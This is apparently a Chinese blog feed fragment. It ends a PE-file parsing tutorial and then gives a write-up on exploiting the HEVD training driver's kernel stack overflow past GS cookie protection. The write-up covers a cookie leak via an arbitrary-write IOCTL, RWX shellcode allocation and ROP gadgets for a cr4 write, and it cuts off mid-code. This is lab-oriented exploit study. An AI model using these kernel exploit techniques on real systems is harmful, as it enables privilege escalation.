class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Directory Entries</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXPORT          0   <span class="comment">// Export Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_IMPORT          1   <span class="comment">// Import Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_RESOURCE        2   <span class="comment">// Resource Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   <span class="comment">// Exception Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_SECURITY        4   <span class="comment">// Security Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_BASERELOC       5   <span class="comment">// Base Relocation Table</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_DEBUG           6   <span class="comment">// Debug Directory</span></span></span><br><span class="line"><span class="comment">//      IMAGE_DIRECTORY_ENTRY_COPYRIGHT       7   // (X86 usage)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7   <span class="comment">// Architecture Specific Data</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8   <span class="comment">// RVA of GP</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_TLS             9   <span class="comment">// TLS Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10   <span class="comment">// Load Configuration Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11   <span class="comment">// Bound Import Directory in headers</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_IAT            12   <span class="comment">// Import Address Table</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13   <span class="comment">// Delay Load Import Descriptors</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14   <span class="comment">// COM Runtime descriptor</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="节表相关"><a class="markdownIt-Anchor" href="#节表相关"></a> 节表相关</h1><p>再回到NT头中的<code>FileHeader</code>，提取得到节数量</p><p>DOS头和NT头的大小加起来后面就是第一个Section</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_SECTION_HEADER</span> &#123;</span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfRawData;</span><br><span class="line">    DWORD   PointerToRawData;</span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">FilePE::bGetSectionList</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>-&gt;FileContent.<span class="built_in">length</span>() == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">Error</span>(<span class="string">&quot;File content is zero&quot;</span>, DEBUG);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>-&gt;pHeaderNT == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">Error</span>(<span class="string">&quot;NT head not initialize&quot;</span>, DEBUG);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">DWORD SectionNum = <span class="keyword">this</span>-&gt;pHeaderNT-&gt;FileHeader.NumberOfSections;</span><br><span class="line"><span class="keyword">this</span>-&gt;SecNum = SectionNum;</span><br><span class="line"><span class="keyword">this</span>-&gt;SectionList = (PIMAGE_SECTION_HEADER*)<span class="built_in">malloc</span>((SectionNum + <span class="number">1</span>) * <span class="built_in">sizeof</span>(PIMAGE_SECTION_HEADER));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>-&gt;SectionList == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">Error</span>(<span class="string">&quot;Allcate section list memory failed\n&quot;</span>, DEBUG);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; SectionNum; i++)</span><br><span class="line">&#123;</span><br><span class="line">SectionList[i] = <span class="built_in">PIMAGE_SECTION_HEADER</span>(</span><br><span class="line">&amp;<span class="keyword">this</span>-&gt;FileContent[<span class="number">0</span>] + <span class="keyword">this</span>-&gt;pHeaderDOS-&gt;e_lfanew </span><br><span class="line">+ <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS) + i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="iat表"><a class="markdownIt-Anchor" href="#iat表"></a> IAT表</h1><h2 id="i-如何找到文件的iat表"><a class="markdownIt-Anchor" href="#i-如何找到文件的iat表"></a> I. 如何找到文件的IAT表</h2><p>IAT叫Import Address Table，当我们的程序需要外部库的函数时，就会从这里开始调用</p><p>IAT表的地址并不在任何头中，不过我们之前分析<code>Directory</code>的时候就发现会有一个<code>IMAGE_DIRECTORY_ENTRY_IAT</code>，<strong>但它不是导入表</strong>，真正的IAT描述：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pHeaderNT-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]</span><br></pre></td></tr></table></figure><p>按道理来说<code>VirtualAddress+ImageBase</code>就是运行起来的地址，这里我没有加上</p><p>突然想起来我们在分析节表的时候也存在类似的 基地址+偏移</p><p>对于这个结构体之前的只能用这块儿的目录</p><p><img src="https://img.joe1sn.top/uploads/big/64d79e16f1f82549728ea2485f24e2ae.png" alt="image-20240225200226287" /></p><p>对应文件中地址为<code>28fc-2000+1400 = 1cfc</code></p><p><img src="https://img.joe1sn.top/uploads/big/6f62574a7f77ff1f01ff30421a8debb9.png" alt="image-20240225201254439" /></p><p>有点意思，查阅资料发现对应的结构体：<code>_IMAGE_IMPORT_DESCRIPTOR</code>，MSDN中并没有对应说明</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp; </span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT (if bound this IAT has actual addresses)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>有个问题就是这块地址是运行时写入IAT相关信息，我们的静态分析到这一步就算断了</p><p>这里我设计了一个<code>BOOL bGetIAT();</code>函数，直接去读程序的内存，为了简单，就先关闭ASLR</p><p><img src="https://img.joe1sn.top/uploads/big/f9be67365195df36d263aa69506b58df.png" alt="image-20240225191521687" /></p><p><img src="https://img.joe1sn.top/uploads/big/c40d6d7e9614f013dab24ba69eca45f2.png" alt="image-20240225205332584" /></p><p>已经成功读取一个信息，接下来办法全部找出来，自然想到的就是Name为0就退出，但是由于总数不知道，所以需要一个动态容器，我用的<code>vector</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;PIMAGE_IMPORT_DESCRIPTOR&gt; pIATList;</span><br></pre></td></tr></table></figure><p>按照一样的方法全部得到后，再次尝试在运行中读取</p><p><img src="https://img.joe1sn.top/uploads/big/9a5ad9c077dbdbd474c55403306704af.png" alt="image-20240225211740589" /></p><p>但是很多PE分析工具静态也能看得到，利用的是<code>RVA-&gt;RAW</code>的转换</p><p><code>2d52-2000+1400=2152</code></p><p><img src="https://img.joe1sn.top/uploads/big/e35d09a9ba26e92fb594200b44f809eb.png" alt="image-20240225212317511" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">FilePE::PrintIATStatic</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>-&gt;pIATList.<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">Error</span>(<span class="string">&quot;IAT List empty&quot;</span>, DEBUG);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">DWORD VA = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>-&gt;pIATList.<span class="built_in">size</span>(); i++)</span><br><span class="line">&#123;</span><br><span class="line">VA = <span class="keyword">this</span>-&gt;<span class="built_in">dwVAToRaw</span>(<span class="keyword">this</span>-&gt;pIATList[i]-&gt;Name);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;DLL : &quot;</span> &lt;&lt; &amp;<span class="keyword">this</span>-&gt;FileContent[<span class="number">0</span>] + VA &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/832de7fba954f0b7afb7109fe59bf175.png" alt="image-20240225213837289" /></p><h2 id="ii-找到导入函数"><a class="markdownIt-Anchor" href="#ii-找到导入函数"></a> II. 找到导入函数</h2><p>通过<code>OriginalFirstThunk</code>，基本就是<code>OriginalFirstThunk</code>进行转化找到RAW，RAW地方的地址再转为RAW就找到了，最终的位置是一个<code>_IMAGE_IMPORT_BY_NAME</code>结构体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_BY_NAME</span> &#123;</span><br><span class="line">    WORD    Hint;</span><br><span class="line">    CHAR   Name[<span class="number">1</span>];</span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/61868899fc8bd10cb177cd0349be419c.png" alt="image-20240225215424856" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">FilePE::PrintFunction</span><span class="params">(PIMAGE_IMPORT_DESCRIPTOR pIAT)</span> </span>&#123;</span><br><span class="line">DWORD64 VA = *<span class="built_in">PDWORD64</span>(&amp;<span class="keyword">this</span>-&gt;FileContent[<span class="number">0</span>] + <span class="keyword">this</span>-&gt;<span class="built_in">dwVAToRaw</span>(pIAT-&gt;OriginalFirstThunk));</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">1</span>; VA != <span class="number">0</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">PIMAGE_IMPORT_BY_NAME IatName = <span class="built_in">PIMAGE_IMPORT_BY_NAME</span>(&amp;<span class="keyword">this</span>-&gt;FileContent[<span class="number">0</span>] + <span class="keyword">this</span>-&gt;<span class="built_in">dwVAToRaw</span>(VA));</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;    Function &quot;</span> &lt;&lt; IatName-&gt;Name &lt;&lt; endl;</span><br><span class="line">VA = *<span class="built_in">PDWORD64</span>(&amp;<span class="keyword">this</span>-&gt;FileContent[<span class="number">0</span>] + <span class="keyword">this</span>-&gt;<span class="built_in">dwVAToRaw</span>(pIAT-&gt;OriginalFirstThunk) + i * <span class="built_in">sizeof</span>(DWORD64));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/medium/2c0ece8077ee8d172ae716ebdc5d5b77.png" alt="image-20240225223834556" /></p><h1 id="找到入口函数"><a class="markdownIt-Anchor" href="#找到入口函数"></a> 找到入口函数</h1><p>很简单，在上面的<code>nt-&gt;option_header.AddressOfEntryPoint</code>里面，可以直接ImageBase+AddressOfEntryPoint，二进制数据都对的上</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近代码能力飞速提升，顺便复习一下&lt;/p&gt;</summary>
    
    
    
    <category term="program" scheme="https://joe1sn.eu.org/categories/program/"/>
    
    
    <category term="malware" scheme="https://joe1sn.eu.org/tags/malware/"/>
    
    <category term="C" scheme="https://joe1sn.eu.org/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【Win Pwn】HEVD-内核栈溢出GS保护及绕过</title>
    <link href="https://joe1sn.eu.org/2024/02/24/win-hevd-exp-stackoverflow-GS/"/>
    <id>https://joe1sn.eu.org/2024/02/24/win-hevd-exp-stackoverflow-GS/</id>
    <published>2024-02-24T03:10:43.000Z</published>
    <updated>2024-02-24T06:02:06.548Z</updated>
    
    <content type="html"><![CDATA[<p>HEVD中的栈溢出加上GS保护<br />还有一个知识点就是windows内核栈地址泄露</p><span id="more"></span><p>函数功能</p><p><img src="https://img.joe1sn.top/uploads/big/a1743db93e122898948550a845f7d04f.png" alt="image-20240124203451123" /></p><p>在上三篇中讲的很清楚了，这里我关闭了KVAS</p><p><img src="https://img.joe1sn.top/uploads/big/21407e450615457821bd83e162b53ecc.png" alt="image-20240124203542280" /></p><p>又是一段经典的栈溢出，但是有了内核的GS保护</p><h1 id="编写exploit"><a class="markdownIt-Anchor" href="#编写exploit"></a> 编写exploit</h1><p>这里就不得不提到Windows中一种Cannary的绕过方式了，通过try except的Handler进行绕过，很遗憾handler只在32位程序中才保存在栈上</p><p>查阅资料</p><p><a href="https://paper.seebug.org/2017/#22">https://paper.seebug.org/2017/#22</a></p><p><a href="https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html">https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html</a></p><p>cookie值是存储在<code>_data</code>段的第一个</p><p><img src="https://img.joe1sn.top/uploads/big/1c6b200d43a1bc05250cfd066d6c2991.png" alt="image-20240124215049718" /></p><p>函数检查的部分，有一个异或</p><p><img src="https://img.joe1sn.top/uploads/big/fb17ff5c2760ddac222db2dda25f7b7f.png" alt="image-20240124215249257" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dqs rsp</span><br><span class="line">ffff8788`21979540  00000000`00000000</span><br><span class="line">ffff8788`21979548  ffffc186`261f98f0</span><br><span class="line">ffff8788`21979550  ffffc186`269c86b0</span><br><span class="line">ffff8788`21979558  00000000`80000004</span><br><span class="line">ffff8788`21979560  00000000`00000000</span><br><span class="line">ffff8788`21979568  fffff804`2a4d66e5 HEVD!TriggerBufferOverflowStackGS+0x5 [c:\projects\hevd\driver\hevd\bufferoverflowstackgs.c @ 70]</span><br><span class="line">ffff8788`21979570  00000000`00000000</span><br><span class="line">ffff8788`21979578  00000000`00000003</span><br><span class="line">ffff8788`21979580  54535f57`4f4c4652</span><br><span class="line">ffff8788`21979588  ffffc186`1f93206c</span><br><span class="line">ffff8788`21979590  00000000`00000000</span><br><span class="line">ffff8788`21979598  00000000`00000000</span><br><span class="line">ffff8788`219795a0  00000000`00000000</span><br><span class="line">ffff8788`219795a8  00000000`00000000</span><br><span class="line">ffff8788`219795b0  ffff8788`219796a0</span><br><span class="line">ffff8788`219795b8  00000000`00000000</span><br><span class="line"></span><br><span class="line">1: kd&gt; r rax</span><br><span class="line">rax=0000ad1068899811</span><br><span class="line"></span><br><span class="line">1: kd&gt; s rsp L1000 07 20 22</span><br><span class="line">ffff8788`219797e8  07 20 22 00 00 00 00 00-20 0d 07 27 86 c1 ff ff  . &quot;..... ..&#x27;....</span><br><span class="line">ffff8788`21979988  07 20 22 00 86 c1 ff ff-00 00 00 00 00 00 00 00  . &quot;.............</span><br><span class="line">ffff8788`21979a48  07 20 22 00 ff ff ff ff-30 e8 d9 1f 07 00 00 00  . &quot;.....0.......</span><br><span class="line">ffff8788`21979ab8  07 20 22 00 00 00 00 00-30 e8 d9 1f 07 00 00 00  . &quot;.....0.......</span><br><span class="line">1: kd&gt; ? ffff8788`219797e8-rsp</span><br><span class="line">Evaluate expression: 680 = 00000000`000002a8</span><br></pre></td></tr></table></figure><ol><li><p>利用之前的<code>ulGetBase</code>得到<code>HEVD.sys</code>的基地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dqs  0xfffff80522fe0000+3000</span><br><span class="line">fffff805`22fe3000  00006fd9`604347b3</span><br><span class="line">fffff805`22fe3008  ffff9026`9fbcb84c</span><br></pre></td></tr></table></figure><p>再下断点看看是不是为这个值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">HEVD!TriggerBufferOverflowStackGS+0x1b:</span><br><span class="line">fffff805`230666fb 4833c4          xor     rax,rsp</span><br><span class="line">1: kd&gt; r rax</span><br><span class="line">rax=00006fd9604347b3</span><br></pre></td></tr></table></figure><p>还真是，那么访问<code>base+3000</code>就可以得<code>cookie</code>值</p></li><li><p>如何读取？这个还真没办法，只能利用另外一个漏洞<code>HEVD_IOCTL_ARBITRARY_WRITE</code>，将该值修改为我们自己的值，也可以设置<code>Ring3ToKernel</code>中的一个地址的值为待写入的地方，然后利用这个漏洞将<code>cookie</code>写入</p></li><li><p><code>key</code>值位于<code>rsp</code>上，利用<code>NtQuerySystemInformation</code>中的<code>PSYSTEM_EXTENDED_PROCESS_INFORMATION</code>可以得到，</p><p>但是后面又看不了了，这个时候我想了下，一个exp可以看到另外一个exp的栈地址，但是查看自身的时候已经不在上面了，或许改为线程执行可以？</p><p><img src="https://img.joe1sn.top/uploads/big/afed146baf184820b89d608a1d389bea.png" alt="image-20240224093858858" /></p><p>就用这种方法试试看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] Found Ring3ToKernel.exe</span><br><span class="line">Stack base 0xffffef8360dce000   Stack limit 0xffffef8360dc8000</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/2bbb268241ad0b8cb84e109543a4d1c3.png" alt="image-20240224101543720" /></p><p>偏移是一个定值，再回忆一下之前的cookie生成算法就能得cookie了<br />但是有个小问题，合成cookie时，rsp值变化了</p><p><img src="https://img.joe1sn.top/uploads/big/a8a2278b4ba72209556e3640b3b8b4ff.png" alt="image-20240224103819644" /><br />考虑到push和sub所以：rsp = stack base - 0x868 - 0x258</p><p>此实，key值为：0000768c469d2a88，rsp = ffffef83619aa798，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(0x0000768c469d2a88^(0xffffef83619aa798-0x258))</span><br><span class="line">&#x27;0xffff990f27078fc8&#x27;</span><br></pre></td></tr></table></figure><p>得到cookie值为<code>0xffff990f27078fc8</code></p><p><img src="https://img.joe1sn.top/uploads/big/708fcb6fd0aa1439e655314f5cb7e5ad.png" alt="image-20240224103938531" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie Address 0x%llx\n&quot;</span>,cookie_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Atribute Write GET key value\n&quot;</span>);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WRITE_WHAT_WHERE</span></span><br><span class="line">&#123;</span><br><span class="line">funcaddr* What;</span><br><span class="line">funcaddr* Where;</span><br><span class="line">&#125;arbitrary_write, * pArbitraryWrite;</span><br><span class="line">funcaddr value = <span class="number">0</span>;</span><br><span class="line">pArbitraryWrite payload = (pArbitraryWrite)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(arbitrary_write));</span><br><span class="line">payload-&gt;What = (funcaddr*)cookie_addr;</span><br><span class="line">payload-&gt;Where = &amp;value;</span><br><span class="line">DWORD size = <span class="built_in">sizeof</span>(payload);</span><br><span class="line">DWORD info = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, <span class="number">0x22200B</span>,</span><br><span class="line">payload, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Key value 0x%llx\n&quot;</span>, value);</span><br></pre></td></tr></table></figure></li><li><p>然后就是经典常规栈溢出+ROP打法</p></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflowGS</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD oldProtect;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start Exploit\n&quot;</span>);</span><br><span class="line">LPVOID shellcode_addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>,</span><br><span class="line"><span class="built_in">sizeof</span>(cmd),</span><br><span class="line">MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(shellcode_addr, cmd, <span class="built_in">sizeof</span>(cmd));</span><br><span class="line"></span><br><span class="line"><span class="built_in">ulGetStackLimit</span>(<span class="string">L&quot;Ring3ToKernel.exe&quot;</span>);</span><br><span class="line">funcaddr base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line">funcaddr pop_rcx = base + <span class="number">0x20C64C</span>;</span><br><span class="line">funcaddr mov_cr4_rcx = base + <span class="number">0x39eb47</span>;</span><br><span class="line">funcaddr hevd_base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;HEVD.sys&quot;</span>);</span><br><span class="line">funcaddr cookie_addr = hevd_base + <span class="number">0x3000</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie Address 0x%llx\n&quot;</span>,cookie_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Atribute Write GET key value\n&quot;</span>);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WRITE_WHAT_WHERE</span></span><br><span class="line">&#123;</span><br><span class="line">funcaddr* What;</span><br><span class="line">funcaddr* Where;</span><br><span class="line">&#125;arbitrary_write, * pArbitraryWrite;</span><br><span class="line">funcaddr value = <span class="number">0</span>;</span><br><span class="line">pArbitraryWrite payload = (pArbitraryWrite)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(arbitrary_write));</span><br><span class="line">payload-&gt;What = (funcaddr*)cookie_addr;</span><br><span class="line">payload-&gt;Where = &amp;value;</span><br><span 